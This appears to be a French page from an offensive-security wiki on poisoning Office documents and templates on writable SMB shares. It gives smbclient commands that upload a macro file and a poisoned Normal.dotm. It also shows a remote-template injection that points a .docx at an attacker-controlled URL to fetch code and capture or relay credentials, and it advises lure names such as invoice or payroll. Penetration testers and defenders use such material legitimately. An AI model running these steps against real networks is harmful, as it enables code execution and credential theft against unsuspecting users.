---
title: "Empoisonnement d'Office et de modèles : exécution à l'ouverture d'un document par un utilisateur"
order: 2
description: "Les documents Office sur un partage inscriptible exécutent le contenu de l'attaquant lorsqu'un utilisateur les ouvre : les documents avec macros exécutent leur VBA, et les modèles globaux et de groupe de travail (Normal.dotm, dossiers de démarrage) s'exécutent à chaque lancement. L'injection de modèle distant et de référence externe récupère en plus le contenu de l'attaquant depuis un serveur quand un document d'apparence inoffensive s'ouvre."
keywords:
  - macro
  - normal.dotm
  - remote template
  - office poisoning
  - startup templates
---

# Empoisonnement d'Office et de modèles

Les documents Office stockés sur un partage inscriptible deviennent des déclencheurs d'exécution lorsque les utilisateurs les ouvrent. La forme directe est un document avec macros dont le VBA s'exécute à l'ouverture (selon les paramètres de macros de l'utilisateur). La forme plus insidieuse vise les modèles : le `Normal.dotm` de Word et les dossiers de démarrage d'Office contiennent du code et des paramètres chargés à chaque lancement, de sorte qu'empoisonner un modèle partagé ou itinérant s'exécute à chaque démarrage. Et l'injection de modèle distant ou de référence externe fait qu'un document par ailleurs sain récupère et exécute le contenu de l'attaquant depuis un serveur à son ouverture, ce qui force aussi l'authentification.

## Voies

```bash
# 1. macro document on the share (runs VBA on open if macros are allowed)
smbclient //<t>/share -U 'user%pass' -c 'put invoice.xlsm'
# 2. poison a shared/roaming template so code runs on every Office launch
#    Normal.dotm (Word), or files in the Office STARTUP folder, if share-hosted
smbclient //<t>/profiles -U 'user%pass' -c 'cd Templates; put Normal.dotm'
# 3. remote-template injection: a .docx references an external template URL the
#    attacker controls; opening the doc fetches template.dotm (code + auth)
#    edit word/_rels/settings.xml.rels Target to http(s)://attacker/template.dotm
```

L'injection de modèle distant fonctionne parce qu'un document Office Open XML enregistre le modèle sur lequel il est basé comme cible d'une relation ; remplacer cette cible par une URL de l'attaquant fait que le client récupère le modèle distant à l'ouverture, lequel peut porter une macro et force le client à demander l'URL (fuite ou relais de l'authentification si elle est UNC/HTTP).

## Notes d'exploitation

- L'exécution des macros dépend de la politique de macros de l'utilisateur ; l'empoisonnement de modèles (`Normal.dotm`, STARTUP) est plus puissant là où ceux-ci sont hébergés sur un partage, car il s'exécute à chaque lancement indépendamment des invites par document.
- L'injection de modèle distant fait aussi office de coercition : une cible de modèle UNC ou HTTP fait que le client s'authentifie auprès de l'attaquant, se combinant avec la [signature et le relais](../signing-and-relay.md).
- Nommez le document empoisonné pour inciter à l'ouverture (facture, rapport, paie) et placez-le là où l'utilisateur cible travaille ; l'exécution se fait dans le contexte de cet utilisateur.
- Ceci se déclenche à l'ouverture plutôt qu'à la consultation du dossier ; utilisez la [coercition SCF et LNK](scf-and-lnk-coercion.md) pour le cas de la simple consultation.

## Références

- [MITRE ATT&CK : injection de modèle](https://attack.mitre.org/techniques/T1221/)
- [MITRE ATT&CK : démarrage d'application Office](https://attack.mitre.org/techniques/T1137/)
